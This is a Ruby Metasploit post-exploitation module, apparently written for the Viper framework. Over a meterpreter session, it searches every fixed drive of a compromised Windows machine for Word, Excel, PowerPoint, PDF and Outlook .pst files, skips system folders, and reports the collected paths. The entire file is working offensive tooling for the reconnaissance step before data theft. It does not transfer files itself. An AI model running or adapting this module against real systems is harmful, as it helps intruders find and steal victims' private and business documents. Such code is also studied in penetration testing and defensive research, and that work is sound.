##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'csv'
require 'time'


class MetasploitModule < Msf::Post
  include Msf::Post::File



  def initialize(info = {})
    super(update_info(info,
                      'Name'         => 'locate useful documents',
                      'Description'  => %q{This module can by used to locate PDF,Excel,Word and CSV on the victim},
                      'License'      => MSF_LICENSE,
                      'Author'       => [
                              'viper' # @JonValt
                      ],
                      'Platform'     => %w{ win },
                      'SessionTypes' => ['meterpreter']
          ))
    register_options(
            [

            ])
  end

  #
  # Execute the module.
  #
  def run
    extensions     = ["*.doc", "*.docx", "*.ppt", "*.pst", "*.pdf", "*.pptx", "*.xls", "*.xlsx"]
    extensions_ext = [".doc", ".docx", ".ppt", ".pst", ".pdf", ".pptx", ".xls", ".xlsx"]
    pass_dir       = ["Windows",
                      "System Volume Information",
                      "Program Files",
                      "Program Files (x86)",
                      "ProgramData",
                      "Recovery",
                      "PerfLogs",
                      "inetpub",
                      "Boot",
                      ".",
                      ".."]

    mounts = session.fs.mount.show_mount


    gather_files = []

    mounts.each do |d|
      if d[:type].to_s == "fixed"
        session.fs.dir.entries_with_info(d[:name]).each do |p|
          unless pass_dir.include? p['FileName']
            ffstat = p['StatBuf']
            type   = ffstat ? ffstat.ftype : 'unknown'

            if type == "directory"
              extensions.each do |ext|
                begin
                  files = session.fs.file.search(p['FilePath'], ext, true, timeout = 360)
                  files.each do |file|
                    remotepath = File.join(file['path'], file['name'])
                    gather_files << remotepath
                  end
                rescue ::Exception => e

                end
              end
            elsif type == "file"
              if extensions_ext.include? File.extname(p['FileName'])
                gather_files << File.join(p['FilePath'])
              end
            end
          end
        end
      end
    end
    print_status(gather_files.to_s)
    pub_json_result(true,
                    nil,
                    gather_files,
                    self.uuid)
  end

end
